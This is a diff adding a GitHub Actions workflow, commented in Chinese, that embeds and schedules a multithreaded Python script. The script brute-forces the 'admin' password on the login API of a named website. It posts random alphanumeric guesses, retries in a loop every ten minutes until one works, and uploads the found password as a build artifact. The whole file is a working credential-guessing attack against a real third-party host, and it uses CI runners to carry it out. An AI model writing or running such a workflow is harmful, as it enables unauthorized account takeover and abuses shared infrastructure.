@@ -1,0 +1,150 @@
+name: Password Brute Force
+
+on:
+  workflow_dispatch:  # 允许手动触发
+  schedule:
+    - cron: '0 */2 * * *'  # 每6小时运行一次
+
+jobs:
+  brute-force:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install requests
+
+    - name: Run brute force script
+      run: |
+        cat > brute_force.py << 'EOF'
+        import random
+        import string
+        import requests
+        import json
+        import time
+        import threading
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+
+        # 随机生成 6~10 位的密码（字母+数字）
+        def random_password():
+            length = random.randint(6, 10)
+            chars = string.ascii_letters + string.digits  # a-zA-Z0-9
+            return ''.join(random.choice(chars) for _ in range(length))
+
+        # 尝试登录的函数
+        def try_login(password, attempt, max_attempts):
+            url = "https://zank666api.icu/proxy/api/back/back-user/login"
+            
+            headers = {
+                "Host": "zank666api.icu",
+                "Content-Type": "application/json;charset=utf-8",
+                "Origin": "https://zank666api.icu",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Accept": "application/json, text/plain, */*",
+                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
+                "Referer": "https://zank666api.icu/",
+                "Accept-Language": "zh-CN,zh-Hans;q=0.9"
+            }
+            
+            data = {
+                "password": password,
+                "userName": "admin"
+            }
+
+            try:
+                response = requests.post(url, headers=headers, data=json.dumps(data), timeout=10)
+                print(f"[{attempt}/{max_attempts}] 尝试密码: {password} | 状态码: {response.status_code}")
+
+                # 更灵活的成功判断条件
+                if (response.status_code == 200 and 
+                    ("成功" in response.text or 
+                     "token" in response.text.lower() or 
+                     "success" in response.text.lower())):
+                    print("✅ 登录成功! 密码是:", password)
+                    print("响应内容:", response.text)
+                    # 保存密码到文件
+                    with open("password.txt", "w") as f:
+                        f.write(password)
+                    return True, password
+                else:
+                    print(f"❌ 登录失败，响应: {response.text[:200]}")  # 打印前200字符避免太长
+                    return False, None
+
+            except requests.exceptions.RequestException as e:
+                print(f"[{attempt}/{max_attempts}] 请求错误: {e}")
+                return False, None
+
+        # 多线程爆破函数
+        def brute_force_parallel(max_attempts=100, max_workers=5):
+            found = False
+            correct_password = None
+            
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                # 创建任务
+                future_to_attempt = {
+                    executor.submit(try_login, random_password(), i, max_attempts): i 
+                    for i in range(1, max_attempts+1)
+                }
+                
+                # 处理完成的任务
+                for future in as_completed(future_to_attempt):
+                    attempt = future_to_attempt[future]
+                    try:
+                        success, password = future.result()
+                        if success:
+                            found = True
+                            correct_password = password
+                            # 取消所有未完成的任务
+                            for f in future_to_attempt:
+                                f.cancel()
+                            break
+                    except Exception as e:
+                        print(f"尝试 {attempt} 生成异常: {e}")
+            
+            return found, correct_password
+
+        if __name__ == "__main__":
+            print("开始密码爆破...")
+            print("=" * 50)
+            
+            # 使用多线程方式
+            start_time = time.time()
+            found, password = brute_force_parallel(max_attempts=500, max_workers=10)  # 增加尝试次数和线程数
+            end_time = time.time()
+            
+            print("=" * 50)
+            if found:
+                print(f"🎉 爆破成功! 密码是: {password}")
+                exit(0)  # 成功退出
+            else:
+                print("❌ 本轮爆破失败，未找到正确密码")
+                exit(1)  # 失败退出
+        EOF
+        
+        # 运行爆破脚本，直到成功找到密码
+        while true; do
+          python brute_force.py
+          if [ $? -eq 0 ]; then
+            echo "密码已找到!"
+            break
+          fi
+          echo "等待10分钟后继续尝试..."
+          sleep 600  # 等待10分钟后再试
+        done
+
+    - name: Upload result
+      if: success()
+      uses: actions/upload-artifact@v3
+      with:
+        name: password-result
+        path: password.txt
